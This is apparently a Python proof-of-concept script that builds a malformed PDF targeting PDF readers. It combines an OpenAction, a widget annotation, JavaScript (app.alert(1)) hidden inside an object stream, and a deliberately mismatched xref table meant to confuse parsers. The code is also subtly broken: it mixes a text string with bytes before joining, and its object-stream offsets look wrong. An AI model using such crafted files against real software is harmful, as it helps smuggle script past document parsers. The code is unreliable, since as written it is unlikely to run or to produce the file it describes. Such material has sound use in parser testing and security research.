import zlib
parts=[]
parts.append('%PDF-1.5\n%\xe2\xe3\xcf\xd3\n')
off={}
def obj(n,s):
    off[n]=sum(len(p) for p in parts)
    parts.append(f'{n} 0 obj\n'.encode('latin1')+s+b'\nendobj\n')
obj(1,b'<< /Type /Catalog /Pages 2 0 R /OpenAction 6 0 R >>')
obj(2,b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>')
obj(3,b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] /Resources << /XObject << /Im1 5 0 R >> >> /Contents 4 0 R /Annots [6 0 R] >>')
content=b'q 10 0 0 10 0 0 cm /Im1 Do Q\n'
obj(4,b'<< /Length %d >>\nstream\n'%len(content)+content+b'endstream')
obj(5,b'<< /Type /XObject /Subtype /Image /Width 1 /Height 1 /ColorSpace 7 0 R /BitsPerComponent 8 /Length 3 >>\nstream\n\x00\x00\x00\nendstream')
obj(6,b'<< /Type /Annot /Subtype /Widget /Rect [0 0 1 1] /A << /S /GoTo /D 7 0 R >> >>')
# objstm contains object 7 as indirect ref to 8, and 8 as dict maybe color space/name etc
stream=b'7 0 8 6\n8 0 R << /S /JavaScript /JS (app.alert(1)) >> '
# no compression
obj(9,b'<< /Type /ObjStm /N 2 /First 10 /Length %d >>\nstream\n'%len(stream)+stream+b'\nendstream')
# xref table: object 7,8 compressed in objstm 9. gen field index.
xref_start=sum(len(p) for p in parts)
parts.append(b'xref\n0 10\n')
parts.append(b'0000000000 65535 f \n')
for n in range(1,10):
    if n in (7,8):
        parts.append(f'{9:010d} {0 if n==7 else 1:05d} n \n'.encode())
    else:
        parts.append(f'{off.get(n,0):010d} 00000 n \n'.encode())
parts.append(b'trailer\n<< /Size 10 /Root 1 0 R >>\nstartxref\n')
parts.append(str(xref_start).encode()+b'\n%%EOF\n')
open('/workspace/poc1.pdf','wb').write(b''.join(parts))
print(len(b''.join(parts)), xref_start)
